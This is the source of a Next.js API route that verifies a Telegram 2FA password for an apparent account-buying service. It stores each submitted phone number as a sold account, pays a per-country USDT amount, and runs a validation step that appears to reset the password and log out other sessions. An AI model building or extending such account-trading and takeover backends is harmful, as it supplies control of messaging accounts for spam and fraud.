import { NextRequest, NextResponse } from 'next/server'
import { verify2FA } from '@/lib/telegram/auth'
import { getDb } from '@/lib/mongodb/connection'
import { validateAccount } from '@/lib/services/account-validation'

/**
 * POST /api/telegram/auth/verify-2fa
 * Verify 2FA password
 */
export async function POST(request: NextRequest) {
  try {
    // Parse request body with error handling
    let body
    try {
      body = await request.json()
    } catch (parseError) {
      console.error('[Verify2FA] Failed to parse request body:', parseError)
      return NextResponse.json(
        { success: false, error: 'Invalid request format' },
        { status: 400 }
      )
    }

    const { phoneNumber, sessionString, password, telegramId } = body

    if (!phoneNumber || !sessionString || !password) {
      return NextResponse.json(
        { success: false, error: 'Phone number, session string, and password are required' },
        { status: 400 }
      )
    }

    console.log(`[Verify2FA] Verifying 2FA for: ${phoneNumber}`)

    const result = await verify2FA(phoneNumber, sessionString, password)

    if (result.success) {
      // Create or update account record in database
      if (telegramId) {
        try {
          const db = await getDb()
          
          // Get user from database
          const user = await db.collection('users').findOne({ telegram_id: telegramId })
          
          if (user) {
            // Check if phone number already exists (globally, not just for this user)
            const existingAccount = await db.collection('accounts').findOne({
              phone_number: phoneNumber
            })

            if (existingAccount) {
              // Phone number already sold/submitted by someone
              if (existingAccount.user_id !== user._id) {
                console.log(`[Verify2FA] ❌ Phone number ${phoneNumber} already submitted by another user`)
                return NextResponse.json({
                  success: false,
                  error: 'PHONE_ALREADY_SOLD',
                  message: 'This phone number has already been submitted by another user. Each number can only be sold once.'
                }, { status: 400 })
              }
              
              // Same user submitted this number before
              console.log(`[Verify2FA] ℹ️  User already submitted ${phoneNumber}, status: ${existingAccount.status}`)
              
              // If already accepted or rejected, return success with account info (they're just viewing it)
              if (existingAccount.status === 'accepted' || existingAccount.status === 'rejected') {
                console.log(`[Verify2FA] ℹ️ User viewing their ${existingAccount.status} account`)
                return NextResponse.json({
                  success: true,
                  userId: result.userId,
                  message: 'Login successful! Session created.',
                  accountStatus: existingAccount.status,
                  accountInfo: {
                    phone: existingAccount.phone_number,
                    amount: existingAccount.amount,
                    status: existingAccount.status,
                    createdAt: existingAccount.created_at
                  }
                })
              }
              
              // If pending, check auto-approve
              console.log(`[Verify2FA] Account exists, checking auto-approve...`)
              
              // Detect country from phone number
              let autoApproveMinutes = 1440 // Default (24 hours in minutes)
              
              // Extract country code from phone number (e.g., +1234567890 -> try 1, 12, 123, 1234)
              const phoneDigits = phoneNumber.replace(/[^\d]/g, '')
              let countryFound = false
              
              for (let i = 1; i <= Math.min(4, phoneDigits.length) && !countryFound; i++) {
                const possibleCode = phoneDigits.substring(0, i)
                const country = await db.collection('country_capacity').findOne({ 
                  country_code: possibleCode 
                })
                
                if (country) {
                  autoApproveMinutes = country.auto_approve_minutes ?? 1440
                  console.log(`[Verify2FA] Country found: ${country.country_name}, auto-approve: ${autoApproveMinutes}min`)
                  countryFound = true
                }
              }
              
              if (!countryFound) {
                // Fallback to global setting
                const settings = await db.collection('settings').findOne({ setting_key: 'auto_approve_minutes' })
                autoApproveMinutes = parseInt(settings?.setting_value || '1440')
                console.log(`[Verify2FA] No country match, using global setting: ${autoApproveMinutes}min`)
              }
              
              // Calculate time difference
              const now = new Date()
              const createdAt = existingAccount.created_at
              const minutesPassed = (now.getTime() - createdAt.getTime()) / (1000 * 60)
              
              console.log(`[Verify2FA] Minutes since creation: ${minutesPassed.toFixed(2)}, Auto-approve after: ${autoApproveMinutes}`)
              
              // Auto-approve if time has passed and status is still pending
              if (minutesPassed >= autoApproveMinutes && existingAccount.status === 'pending') {
                await db.collection('accounts').updateOne(
                  { _id: existingAccount._id },
                  { 
                    $set: { 
                      status: 'accepted',
                      approved_at: new Date(),
                      auto_approved: true,
                      updated_at: new Date()
                    }
                  }
                )
                
                // Add prize amount to user balance
                if (existingAccount.amount && existingAccount.amount > 0) {
                  await db.collection('users').updateOne(
                    { _id: user._id },
                    { $inc: { balance: existingAccount.amount } }
                  )
                  console.log(`[Verify2FA] ✅ Account auto-approved after ${minutesPassed.toFixed(2)} minutes, added $${existingAccount.amount} to balance`)
                } else {
                  console.log(`[Verify2FA] ✅ Account auto-approved after ${minutesPassed.toFixed(2)} minutes (no prize amount)`)
                }
              } else if (existingAccount.status === 'pending' && !existingAccount.master_password_set) {
                // Account is pending but hasn't been validated yet - trigger validation
                console.log(`[Verify2FA] 🔒 Existing account needs validation, triggering now...`)
                const validationResult = await validateAccount({
                  accountId: existingAccount._id,
                  phoneNumber: phoneNumber,
                  sessionString: sessionString,
                  currentPassword: password
                })
                
                if (!validationResult.success) {
                  console.log(`[Verify2FA] ❌ Validation failed: ${validationResult.reason}`)
                } else {
                  console.log(`[Verify2FA] ✅ Validation completed: ${validationResult.sessionsCount} session(s), ${validationResult.loggedOutCount || 0} logged out`)
                }
              }
            } else {
              // Get prize amount from country
              let prizeAmount = 0
              let countryName = 'Unknown'
              const phoneDigits = phoneNumber.replace(/[^\d]/g, '')
              
              console.log(`[Verify2FA] 🔍 Detecting country for ${phoneNumber} (digits: ${phoneDigits})`)
              
              for (let i = 1; i <= Math.min(4, phoneDigits.length); i++) {
                const possibleCode = phoneDigits.substring(0, i)
                console.log(`[Verify2FA] Trying country code: ${possibleCode} and +${possibleCode}`)
                
                // Try both with and without + prefix
                const country = await db.collection('country_capacity').findOne({ 
                  $or: [
                    { country_code: possibleCode },
                    { country_code: `+${possibleCode}` }
                  ]
                })
                
                if (country) {
                  prizeAmount = country.prize_amount || 0
                  countryName = country.country_name
                  console.log(`[Verify2FA] ✅ Country found: ${country.country_name}, Code: ${country.country_code}, Prize: $${prizeAmount}`)
                  break
                }
              }
              
              if (prizeAmount === 0) {
                console.log(`[Verify2FA] ⚠️ No country found or prize is $0 for ${phoneNumber}`)
              }
              
              // Insert new account record with pending status
              const newAccount = await db.collection('accounts').insertOne({
                user_id: user._id,
                phone_number: phoneNumber,
                amount: prizeAmount,
                status: 'pending',
                created_at: new Date()
              })
              
              console.log(`[Verify2FA] 💰 Account created: ${phoneNumber} | Status: PENDING | Prize: $${prizeAmount} USDT (${countryName})`)
              
              // Store flag to indicate new account was created
              const isNewAccount = true
              
              // Increment used capacity for the country
              const phoneDigitsForCapacity = phoneNumber.replace(/[^\d]/g, '')
              for (let i = 1; i <= Math.min(4, phoneDigitsForCapacity.length); i++) {
                const possibleCode = phoneDigitsForCapacity.substring(0, i)
                
                const countryToIncrement = await db.collection('country_capacity').findOne({ 
                  $or: [
                    { country_code: possibleCode },
                    { country_code: `+${possibleCode}` }
                  ]
                })
                
                if (countryToIncrement) {
                  await db.collection('country_capacity').updateOne(
                    { _id: countryToIncrement._id },
                    { 
                      $inc: { used_capacity: 1 },
                      $set: { updated_at: new Date() }
                    }
                  )
                  console.log(`[Verify2FA] ✅ Incremented capacity for ${countryToIncrement.country_name}: ${(countryToIncrement.used_capacity || 0) + 1}/${countryToIncrement.max_capacity}`)
                  break
                }
              }
              
              // Trigger validation immediately with user's 2FA password
              console.log(`[Verify2FA] 🔒 Triggering account validation...`)
              const validationResult = await validateAccount({
                accountId: newAccount.insertedId,
                phoneNumber: phoneNumber,
                sessionString: sessionString,
                currentPassword: password
              })
              
              if (!validationResult.success) {
                console.log(`[Verify2FA] ❌ Validation failed: ${validationResult.reason}`)
              } else {
                console.log(`[Verify2FA] ✅ Validation completed: ${validationResult.sessionsCount} session(s), ${validationResult.loggedOutCount || 0} logged out`)
              }
            }
          }
        } catch (dbError) {
          console.error('[Verify2FA] Database error:', dbError)
        }
      }
      
      // Check if this was a new account creation by looking at the database operation
      let responseMessage = 'Login successful! Session created.'
      
      // Check if account was just created (would be in pending status)
      if (telegramId) {
        const db = await getDb()
        const user = await db.collection('users').findOne({ telegram_id: telegramId })
        if (user) {
          const account = await db.collection('accounts').findOne({ 
            user_id: user._id, 
            phone_number: phoneNumber,
            status: 'pending'
          })
          
          if (account) {
            // New account was created
            responseMessage = '✅ Account received successfully! Session file generated. Please wait for admin approval.'
          }
        }
      }
      
      return NextResponse.json({
        success: true,
        userId: result.userId,
        message: responseMessage,
      })
    } else {
      return NextResponse.json(
        { success: false, error: result.error },
        { status: 400 }
      )
    }
  } catch (error: any) {
    console.error('[Verify2FA] Error:', error)
    return NextResponse.json(
      { success: false, error: error.message || 'Internal server error' },
      { status: 500 }
    )
  }
}
